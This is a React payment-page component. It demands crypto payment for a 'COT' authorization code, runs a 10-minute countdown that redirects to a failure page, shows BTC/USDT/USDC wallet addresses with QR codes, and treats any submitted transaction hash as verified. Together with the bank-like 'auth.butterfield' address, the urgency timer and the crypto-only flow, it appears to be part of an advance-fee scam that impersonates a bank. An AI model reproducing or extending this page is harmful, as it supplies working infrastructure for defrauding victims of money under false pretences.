import { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { getAuthConfig, submitAuthTicket } from '../api';

export default function PaymentProcess() {
  const navigate = useNavigate();
  const [config, setConfig] = useState(null);
  const [method, setMethod] = useState('');
  const [txHash, setTxHash] = useState('');
  const [showPopup, setShowPopup] = useState(false);
  const [message, setMessage] = useState('');
  const [timeLeft, setTimeLeft] = useState(600);
  const codeType = localStorage.getItem('authCodeType') || 'COT';
  const price = localStorage.getItem('authPrice') || '0';
  const name = localStorage.getItem('authName') || '';
  const accountId = localStorage.getItem('authAccountId') || '';

  const qrUrl = (data) => `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(data || '')}`;

  useEffect(() => {
    getAuthConfig().then(({ data }) => setConfig(data)).catch(() => {});
    const savedStart = localStorage.getItem('paymentStart');
    if (!savedStart) {
      localStorage.setItem('paymentStart', Date.now().toString());
    }
    const interval = setInterval(() => {
      const start = parseInt(localStorage.getItem('paymentStart') || Date.now());
      const elapsed = Math.floor((Date.now() - start) / 1000);
      const remaining = Math.max(600 - elapsed, 0);
      setTimeLeft(remaining);
      if (remaining <= 0) {
        clearInterval(interval);
        localStorage.removeItem('paymentStart');
        navigate('/auth-failed');
      }
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    alert('Copied to clipboard!');
  };

  const handlePaid = () => setShowPopup(true);

  const confirmHash = async () => {
    if (txHash.trim().length < 10) return alert('Please enter a valid transaction hash.');
    setMessage('Verifying payment...');
    try {
      await submitAuthTicket({
        name, email: `${accountId}@auth.butterfield`,
        description: `Code Type: ${codeType}, Amount: $${price}, Method: ${method}, TxHash: ${txHash}, Account: ${accountId}`,
        subject: `Code Payment - ${codeType} - ${accountId}`
      });
      localStorage.removeItem('paymentStart');
      localStorage.setItem('txHash', txHash);
      navigate('/auth-success');
    } catch {
      setMessage('Verification failed. Please try again.');
    }
  };

  const mins = Math.floor(timeLeft / 60);
  const secs = timeLeft % 60;

  const wallet = config?.wallets || {};
  const showWallet = ['BTC', 'USDT', 'USDC'].includes(method);

  return (
    <div style={{ minHeight: '100vh', background: '#000', display: 'flex', justifyContent: 'center', alignItems: 'center', fontFamily: 'Segoe UI, sans-serif', flexDirection: 'column', padding: '24px' }}>
      <div style={{ maxWidth: '600px', width: '100%', background: '#0D0D0D', border: '1px solid #1A1A1A', padding: '30px', borderRadius: '16px', textAlign: 'center' }}>
        <div style={{ fontSize: '2rem', marginBottom: '8px' }}>💸</div>
        <h2 style={{ color: '#fff', marginBottom: '8px' }}>Complete Your Payment</h2>
        <p style={{ color: '#FF4EC8', fontWeight: 'bold', fontSize: '18px', marginBottom: '8px' }}>⏳ Time left: {String(mins).padStart(2,'0')}:{String(secs).padStart(2,'0')}</p>
        <p style={{ color: '#B3B3B3' }}>Code Type: <strong style={{ color: '#fff' }}>{codeType}</strong> | Amount: <strong style={{ color: '#FF4EC8' }}>${Number(price).toLocaleString()}</strong></p>
        {message && <div style={{ background: 'rgba(255,78,200,0.12)', color: '#FF4EC8', padding: '8px', borderRadius: '6px', margin: '10px 0', border: '1px solid rgba(255,78,200,0.25)' }}>{message}</div>}

        <select value={method} onChange={(e) => setMethod(e.target.value)} style={{ width: '80%', padding: '12px', margin: '15px auto', borderRadius: '10px', border: '1px solid #1A1A1A', background: 'rgba(0,0,0,0.4)', color: '#fff', display: 'block', fontSize: '16px', outline: 'none' }}>
          <option value="">-- Select Payment Method --</option>
          <option value="BTC">Bitcoin (BTC)</option>
          <option value="USDT">USDT (ERC20)</option>
          <option value="USDC">USDC (ERC20)</option>
          <option value="Visa">Visa</option>
          <option value="Zelle">Zelle</option>
          <option value="ApplePay">Apple Pay</option>
        </select>

        {showWallet && wallet[method] && (
          <div style={{ marginTop: '20px', padding: '15px', border: '1px solid #1A1A1A', borderRadius: '12px', background: 'rgba(0,0,0,0.3)' }}>
            <p style={{ color: '#fff' }}><strong>{method} Address:</strong></p>
            <code style={{ wordBreak: 'break-word', display: 'block', margin: '5px 0', color: '#B3B3B3', fontSize: '0.85rem' }}>{wallet[method]}</code>
            <img src={qrUrl(wallet[method])} alt="QR" style={{ width: '150px', height: '150px', marginTop: '10px', border: '1px solid #1A1A1A', borderRadius: '8px' }} />
            <br />
            <button onClick={() => copyToClipboard(wallet[method])} style={{ marginTop: '10px', padding: '8px 15px', background: '#FF4EC8', color: 'white', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Copy Address</button>
          </div>
        )}

        {method && !['BTC', 'USDT', 'USDC'].includes(method) && (
          <p style={{ color: '#666', marginTop: '20px' }}>Please contact support for {method} payment instructions.</p>
        )}

        {showWallet && wallet[method] && (
          <button onClick={handlePaid} style={{ width: '100%', padding: '14px', marginTop: '20px', background: '#2ed573', color: 'white', border: 'none', borderRadius: '10px', fontWeight: 'bold', cursor: 'pointer', fontSize: '16px' }}>✅ I've Paid</button>
        )}
      </div>

      {showPopup && (
        <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 999 }}>
          <div style={{ background: '#0D0D0D', border: '1px solid #1A1A1A', padding: '30px', borderRadius: '16px', maxWidth: '400px', width: '90%', textAlign: 'center', position: 'relative' }}>
            <span onClick={() => setShowPopup(false)} style={{ position: 'absolute', top: 10, right: 15, fontSize: '24px', cursor: 'pointer', color: '#666' }}>✕</span>
            <h3 style={{ color: '#fff', marginBottom: '16px' }}>Enter Transaction Hash</h3>
            <input type="text" placeholder="Transaction Hash ID" value={txHash} onChange={(e) => setTxHash(e.target.value)} style={{ width: '80%', padding: '12px', borderRadius: '10px', border: '1px solid #1A1A1A', background: 'rgba(0,0,0,0.4)', color: '#fff', fontSize: '16px', outline: 'none' }} />
            <button onClick={confirmHash} disabled={txHash.trim().length < 10} style={{ width: '100%', padding: '12px', marginTop: '20px', background: txHash.trim().length >= 10 ? '#FF4EC8' : '#1A1A1A', color: 'white', border: 'none', borderRadius: '10px', fontWeight: 'bold', cursor: txHash.trim().length >= 10 ? 'pointer' : 'not-allowed' }}>Confirm Payment</button>
          </div>
        </div>
      )}
    </div>
  );
}